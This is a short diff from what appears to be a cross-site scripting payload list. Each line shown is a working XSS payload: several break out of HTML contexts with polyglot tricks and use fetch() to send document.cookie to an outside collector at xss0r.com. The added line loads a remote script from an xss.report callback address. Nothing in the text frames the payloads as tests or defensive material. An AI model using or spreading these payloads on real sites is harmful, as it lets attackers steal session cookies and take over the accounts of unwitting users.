@@ -103,3 +103,4 @@ javascript://%22%3E%3Cscript%20src%3Dhttps%3A%2F%2Fxss0r.com%2Fc%2Fhunterex%3E%3
 javascript://%27%22%3E%3Csvg%20onmouseover%3D%22fetch('https://xss0r.com/c/hunterex?data='+document.cookie)%22%3E%3C%2Fsvg%3E
 javascript:/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/-->&lt;svg/onload=/*<html/*/onmouseover=fetch('https://xss0r.com/c/hunterex?cookie='+document.cookie)//>
 javascript://</script></textarea></style></noscript></noembed></script></template>&lt;svg/onload=/*fetch('https://xss0r.com/c/hunterex?cookie='+document.cookie)/*--><html */ onmouseover=alert()//>
+'//><scrIpt src=//xss.report/c/hnterx></scrIpt>
